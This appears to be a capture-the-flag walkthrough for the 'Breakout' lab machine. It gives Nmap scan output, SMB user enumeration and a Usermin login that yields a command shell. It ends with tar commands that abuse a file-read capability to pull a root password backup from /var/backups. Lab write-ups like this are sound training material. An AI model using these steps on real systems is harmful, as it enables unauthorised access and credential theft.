# Nmap

```bash
# Nmap 7.94SVN scan initiated Sun Nov 24 11:28:15 2024 as: /usr/lib/nmap/nmap --privileged -p 80,139,445,10000,20000 -sCV -A -T4 -O -oN scans/service-scan 192.168.1.100
Nmap scan report for 192.168.1.100
Host is up (0.0012s latency).

PORT      STATE SERVICE     VERSION
80/tcp    open  http        Apache httpd 2.4.51 ((Debian))
|_http-title: Apache2 Debian Default Page: It works
|_http-server-header: Apache/2.4.51 (Debian)
139/tcp   open  netbios-ssn Samba smbd 4.6.2
445/tcp   open  netbios-ssn Samba smbd 4.6.2
10000/tcp open  http        MiniServ 1.981 (Webmin httpd)
|_http-server-header: MiniServ/1.981
|_http-title: 200 &mdash; Document follows
20000/tcp open  http        MiniServ 1.830 (Webmin httpd)
|_http-server-header: MiniServ/1.830
|_http-title: 200 &mdash; Document follows
MAC Address: 08:00:27:29:55:DB (Oracle VirtualBox virtual NIC)
Warning: OSScan results may be unreliable because we could not find at least 1 open and 1 closed port
Device type: general purpose
Running: Linux 4.X|5.X
OS CPE: cpe:/o:linux:linux_kernel:4 cpe:/o:linux:linux_kernel:5
OS details: Linux 4.15 - 5.8
Network Distance: 1 hop

Host script results:
| smb2-security-mode: 
|   3:1:1: 
|_    Message signing enabled but not required
|_nbstat: NetBIOS name: BREAKOUT, NetBIOS user: <unknown>, NetBIOS MAC: <unknown> (unknown)
| smb2-time: 
|   date: 2024-11-24T10:28:29
|_  start_date: N/A

TRACEROUTE
HOP RTT     ADDRESS
1   1.15 ms 192.168.1.100

OS and Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
# Nmap done at Sun Nov 24 11:28:59 2024 -- 1 IP address (1 host up) scanned in 43.67 seconds
```


### Services

- **SMB:** Enumerate through enum4linux to get user **cyber** (`enum4linux 192.168.56.101 -a`)
- **Apache Server (80):** Here we find the cyber password encrypted in BrainFuck! language, it is hidden in the landing page source code
- **Usermin (20000):** With cyber credentials we can access and we can get RCE in **Usermin/Login/Command Shell**
- **Webmin (10000):** Not useful


### Privilege escalation

In cyber home folder we find **tar** binary, if we inspect the binary we see that it has read capabilities (**cap_dac_read_search=ep**) so we can read any file in the system by compressing it with tar and decompressing it. We found in **/var/backups** a backup for root password:

	/home/cyber/tar -cf - /var/backups/.old_pass.bak > old_pass.tar
	/home/cyber/tar -xf old_pass.tar
	
And we can read root pasword and change user with `su root`